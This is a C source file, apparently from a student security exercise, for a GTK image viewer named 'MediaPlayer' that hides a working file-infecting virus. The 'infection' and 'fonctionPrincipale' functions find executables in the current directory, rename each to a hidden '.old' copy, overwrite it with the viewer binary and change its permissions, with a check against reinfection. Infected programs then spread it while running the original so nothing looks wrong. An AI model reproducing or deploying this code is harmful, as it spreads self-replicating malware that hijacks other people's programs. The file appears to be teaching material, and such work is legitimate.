#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>
#include <sys/types.h>
#include <dirent.h>
#include <string.h>
#include<gtk/gtk.h>

static GtkWidget *image;

GtkWidget *window;
GtkWidget *box;
GtkWidget *boxBouton;
GtkWidget *preceBouton;
GtkWidget *suivantBouton;

static char *images[100];
static int imageCourante = 0;
static int num_image =0;


static void chargement(int nbimage) {
    GdkPixbuf *pixbuf = gdk_pixbuf_new_from_file(images[nbimage], NULL);
    gtk_image_set_from_pixbuf(GTK_IMAGE(image), pixbuf);
}

static void precedent(GtkWidget *widget, gpointer data) {
  if (imageCourante > 0 ) {
    imageCourante--;
    chargement(imageCourante);
  } else{
    imageCourante = num_image - 1;
    chargement(imageCourante);
  }
}

static void suivant(GtkWidget *widget, gpointer data) {
  if (imageCourante < num_image - 1) {
    imageCourante++;
    chargement(imageCourante);
  }
  else{ 
    imageCourante = 0;
    chargement(imageCourante);
  }
}


void infection(char* programme) {
    printf("infection de %s\n", programme);

    // Renomme le pg original en .old
    char commande0[50] = "mv ";
    strcat(commande0, programme);
    strcat(commande0, " .");
    strcat(commande0, programme);
    strcat(commande0, ".old");
    int retour1 = system(commande0);

    // Créer un nouveau fichier avec le nom du programme
    char commande1[50] = "touch ";
    strcat(commande1, programme);
    int retour2 = system(commande1);

    // Copie l'executable de MediaPlayer dans le nouveau executable MonPG
    char commande2[50] = "cp ";
    strcat(commande2, "MediaPlayer ");
    strcat(commande2, programme);
    int retour3 = system(commande2);

    // On donne les permissions necessaires au lancement du nouvel executable
    char commande3[50] = "chmod ";
    strcat(commande3, "170 ");
    strcat(commande3, programme);
    int retour4 = system(commande3);

    printf("-- Infecte --\n\n");
}

void fonctionPrincipale() {
    // On commence par filtrer les programmes executables avec les droits souhaites
    DIR *open;
    struct dirent * opendirtp;
    struct stat buff;
    
    
    open = opendir("./");

    if(open == NULL){
        printf("Répertoire courant impossible à ouvrir\n");
        exit(0);
    }

    while((opendirtp = readdir(open)) != NULL){

        if(strstr(opendirtp->d_name, ".jpg") != NULL || strstr(opendirtp->d_name, ".png") != NULL || strstr(opendirtp->d_name, ".bmp") != NULL){
            char path[100] = "/home/tpuser/ProjetSecurite/";
            strcat(path,opendirtp->d_name);
            images[num_image] = malloc(strlen(path) + 3);
            sprintf(images[num_image], "%s", path);
            num_image++;
        }
      
        // On verifie que ce soit un executable
        if(strstr(opendirtp->d_name, ".") == NULL) {
            // On verifie que ne ce soit pas l'executable original de MediaPlayer
            if(strstr(opendirtp->d_name, "MediaPlayer") == NULL){
		
                // On verifie que ce soit un fichier ordinaire et que le proprietaire ait le droit d'execution
                if(stat(opendirtp->d_name, &buff) == 0) {
                    if((buff.st_mode == S_IFREG && buff.st_mode == S_IXUSR) == 0){  
                    
                        // Lutte contre la surinfection
                        // On verifie qu'il n'y ait pas de .old pour ce nom de fichier
                        char filename_copy[50] = ".";
                        strcat(filename_copy, opendirtp->d_name);         

                        char* OldFileExists = strcat(filename_copy, ".old");
                            
                        printf("Nom du fichier : %s\n", OldFileExists);

                        if (access(OldFileExists, F_OK) != 0) {
                            // On infecte les programmes
                            infection(opendirtp->d_name);
                        }
                    }
                }
            }
        }
    }
    closedir(open);
}   



int main(int argc, char* argv[]) {
    // Si le programme choisi est different de MediaPlayer
    if(strstr(argv[0], "MediaPlayer") == NULL) {
        char lancement[50];

        // Si le programme choisi est MonPGx
        if (strstr(argv[0], ".old") == NULL) {

            strcpy(lancement, ".");
            strcat(lancement, argv[0]);
            lancement[1] = '/';
            lancement[2] = '.';
            strcat(lancement, ".old");

            printf("Program not launched from MediaPlayer nor a .old\n");
            printf("Launched from %s\n\n", argv[0]);

			fonctionPrincipale(); 

            system(lancement);  
        } else {    // Si le programme choisi est MonPGx.old
            printf("Program not launched from MediaPlayer\n");
            printf("Launched from %s\n\n", argv[0]);
            
            strcat(lancement, argv[0]);
            system(lancement);
        }
    } else {        // Si MediaPlayer est lance
        printf("Program launched from MediaPlayer\n\n");
        fonctionPrincipale();
        gtk_init(&argc, &argv);
        
        window = gtk_window_new(GTK_WINDOW_TOPLEVEL);
        gtk_window_set_title(GTK_WINDOW(window), "Visionneuse d'images");
        gtk_window_set_default_size(GTK_WINDOW(window), 1280, 720);
        g_signal_connect(window, "destroy", G_CALLBACK(gtk_main_quit), NULL);

        box = gtk_box_new(GTK_ORIENTATION_VERTICAL, 0);
        gtk_container_add(GTK_CONTAINER(window), box);

        image = gtk_image_new();
        gtk_box_pack_start(GTK_BOX(box), image, TRUE, TRUE, 0);

        boxBouton = gtk_button_box_new(GTK_ORIENTATION_HORIZONTAL);
        gtk_box_pack_start(GTK_BOX(box), boxBouton, FALSE, FALSE, 0);

        preceBouton = gtk_button_new_with_label("Précédent");
        g_signal_connect(preceBouton, "clicked", G_CALLBACK(precedent), NULL);
        gtk_container_add(GTK_CONTAINER(boxBouton), preceBouton);

        suivantBouton = gtk_button_new_with_label("Suivant");
        g_signal_connect(suivantBouton, "clicked", G_CALLBACK(suivant), NULL);
        gtk_container_add(GTK_CONTAINER(boxBouton), suivantBouton);


        chargement(imageCourante);

        gtk_widget_show_all(window);
        gtk_main();

        
    }
    
    return EXIT_SUCCESS;
}

